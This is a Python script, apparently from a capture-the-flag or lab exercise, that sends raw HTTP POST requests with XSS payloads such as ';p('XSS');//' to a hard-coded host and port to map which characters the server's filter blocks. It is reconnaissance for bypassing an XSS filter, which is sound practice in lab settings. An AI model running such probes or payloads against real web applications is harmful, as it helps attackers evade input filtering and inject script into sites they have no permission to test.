import socket
import time

print("Testing character filter - detecting server behavior")
print("=" * 70)

host = "94.237.49.241"
port = 4200
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# Results
blocked_chars = []
allowed_chars = []
no_response_letters = []

for letter in letters_to_test:
    payload = f"name=;{letter}('XSS');//"
    
    print(f"\nTesting '{letter}' - Payload: {payload}")
    
    try:
        # Create socket with moderate timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  # 10s timeout for this attempt
        
        # Connect (should be fast based on earlier test)
        sock.connect((host, port))
        print(f"  ✓ Connected")
        
        # Build HTTP request
        content_length = len(payload)
        http_request = (
            f"POST /page HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"  # Explicitly close
            f"\r\n"
            f"{payload}"
        )
        
        # Send
        sent = sock.send(http_request.encode('utf-8'))
        print(f"  ✓ Sent {sent}/{len(http_request)} bytes")
        
        # Shutdown write side to signal we're done
        sock.shutdown(socket.SHUT_WR)
        
        # Try to read - use small chunks with timeout
        sock.settimeout(15)
        response = b""
        bytes_received = 0
        
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break  # Socket closed by server
                response += chunk
                bytes_received += len(chunk)
                print(f"  ✓ Received chunk: {len(chunk)} bytes (total: {bytes_received})")
                
                # Look for end of headers or enough data
                if b'\r\n\r\n' in response:
                    break
        except socket.timeout:
            if response:
                print(f"  ⚠ Timeout but received {bytes_received} bytes")
            else:
                print(f"  ⚠ Timeout - no response received")
        except Exception as e:
            print(f"  ⚠ Read error: {str(e)}")
        
        sock.close()
        
        if response:
            # Decode and analyze
            response_text = response.decode('utf-8', errors='ignore')
            print(f"  ✓ Total response: {len(response_text)} bytes")
            
            # Check for blocked pattern
            blocked_pattern = f"Sorry you can't use: '{letter}'"
            if blocked_pattern in response_text:
                print(f"  🔴 [BLOCKED] Character '{letter}' is blocked!")
                blocked_chars.append(letter)
                # Show relevant line
                for line in response_text.split('\n'):
                    if blocked_pattern in line:
                        print(f"      {line.strip()}")
                        break
            else:
                print(f"  🟢 [ALLOWED] Character '{letter}' is not blocked")
                allowed_chars.append(letter)
        else:
            print(f"  ⚠ No response from server")
            no_response_letters.append(letter)
        
        # Small delay between tests
        if letter != letters_to_test[-1]:
            time.sleep(0.5)
            
    except Exception as e:
        print(f"  ✗ Connection/Send error: {str(e)}")

# Summary
print("\n" + "=" * 70)
print("CHARACTER FILTER TEST - SUMMARY")
print("=" * 70)
print(f"Blocked: {sorted(blocked_chars)} (count: {len(blocked_chars)})")
print(f"Allowed: {sorted(allowed_chars)} (count: {len(allowed_chars)})")
print(f"No response: {no_response_letters} (count: {len(no_response_letters)})")

# Check if we met the objective
if blocked_chars or allowed_chars:
    print("\n✓ Objective achieved - identified character filtering")
else:
    print("\n⚠ No conclusive results - all tests timed out or got no response")
    print("Possible causes:")
    print("  - Server intentionally slow/delayed")
    print("  - Request format needs adjustment")
    print("  - Network/firewall interference")
